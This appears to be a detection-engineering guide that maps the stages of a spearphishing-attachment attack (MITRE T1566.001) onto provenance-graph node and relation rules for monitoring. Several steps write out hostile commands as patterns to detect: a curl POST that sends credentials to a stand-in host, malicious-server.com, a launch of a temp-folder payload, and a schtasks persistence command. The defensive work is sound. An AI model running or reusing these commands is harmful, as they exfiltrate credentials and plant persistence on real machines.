1. **Identify Initial Access via Spearphishing Email**  
   - Map the event where the user opens the email in Outlook.  
   - Target the `srcNode` with `Name` as "Outlook" and `relation` as "Process Create".  
   - Capture the `dstNode` as the attachment file "Invoice.xlsx" with `Type` as "File".  

2. **Detect Execution of Malicious Macro**  
   - Monitor for the execution of Excel when the attachment is opened.  
   - Set `srcNode` with `Image` as "C:\\Program Files\\Microsoft Office\\root\\OfficeXX\\EXCEL.EXE" (replace XX with the version number).  
   - Define `relation` as "Process Create" and `dstNode` as the temporary file created during macro execution, e.g., "C:\\Users\\<User>\\AppData\\Local\\Temp\\payload.exe" with `Type` as "File".  

3. **Capture Payload Execution**  
   - Identify the execution of the downloaded payload.  
   - Set `srcNode` with `Image` as "C:\\Windows\\System32\\cmd.exe" and `Cmdline` as `cmd.exe /c start "" "%TEMP%\\payload.exe"`.  
   - Define `relation` as "Process Create" and `dstNode` as the payload executable "payload.exe" with `Type` as "Process".  

4. **Monitor Command and Control Communication**  
   - Detect network connections initiated by the payload to the C2 server.  
   - Set `srcNode` with `Image` as "C:\\Windows\\System32\\cmd.exe" and `Cmdline` containing `curl -X POST http://malicious-server.com/exfiltrate`.  
   - Define `relation` as "TCP Connect" and `dstNode` with `Dstaddress` as "malicious-server.com" and `Port` as 80 or 443, with `Type` as "Network".  

5. **Track Data Exfiltration**  
   - Monitor HTTP requests made by the payload to exfiltrate data.  
   - Set `srcNode` with `Image` as "C:\\Windows\\System32\\cmd.exe" and `Cmdline` containing `curl -X POST http://malicious-server.com/exfiltrate -d "username=user&password=pass"`.  
   - Define `relation` as "TCP Send" and `dstNode` with `Dstaddress` as "malicious-server.com" and `Port` as 80 or 443, with `Type` as "Network".  

6. **Identify Cleanup and Persistence Mechanisms**  
   - Detect the creation of scheduled tasks for persistence.  
   - Set `srcNode` with `Image` as "C:\\Windows\\System32\\schtasks.exe" and `Cmdline` containing `schtasks /create /tn "MaliciousTask" /tr "%TEMP%\\payload.exe" /sc onlogon /rl highest`.  
   - Define `relation` as "Process Create" and `dstNode` with `Name` as "MaliciousTask" and `Type` as "Process".  

By following these steps, you will create a comprehensive detection logic for the T1566.001 - Spearphishing Attachment attack scenario, ensuring that all critical stages of the attack are monitored effectively.
